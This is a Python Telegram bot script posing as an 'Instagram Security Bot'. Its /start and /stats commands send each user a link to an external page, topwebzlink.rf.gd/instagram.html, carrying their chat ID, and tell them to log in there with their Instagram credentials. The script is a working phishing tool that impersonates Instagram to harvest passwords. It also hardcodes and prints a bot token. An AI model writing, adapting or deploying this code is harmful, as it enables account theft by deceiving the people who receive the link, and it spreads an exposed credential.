from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8279598676:AAFwYVtwI2O4F4713fqMyhw1JXXxkpiw_18"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    # Instagram login page URL
    instagram_url = f"https://topwebzlink.rf.gd/instagram.html?chat_id={user_id}&user={username}"
    
    message = f"""
🔐 **Instagram Security Verification**

🌐 **Your Verification Link:**
{instagram_url}

📝 **Instructions:**
1. Click the link above
2. Login with your Instagram credentials
3. Complete security verification

⚠️ **This link is secure and private to you.**

🆔 **Your ID:** `{user_id}`
"""
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 **Instagram Security Bot**

**Commands:**
/start - Get your Instagram verification link
/help - Show this help message
/stats - Show your user statistics

**How it works:**
• Get your personal verification link
• Open it and login to Instagram
• We verify your account security
"""
    await update.message.reply_text(help_text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "User"
    
    stats_text = f"""
📊 **Your Statistics:**

👤 **User Info:**
• Name: {first_name}
• Username: @{username}
• User ID: `{user_id}`

🔗 **Your Instagram Verification:**
https://topwebzlink.rf.gd/instagram.html?chat_id={user_id}

💡 **Click the link to verify your Instagram account.**
"""
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

def main():
    try:
        # Create application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", stats_command))
        
        # Start bot with polling
        print("🤖 Instagram Security Bot Started...")
        print("📍 Using Polling Method")
        print("🔑 Bot Token: 8279598676:AAFwYVtwI2O4F4713fqMyhw1JXXxkpiw_18")
        print("⏳ Bot is running. Waiting for commands...")
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
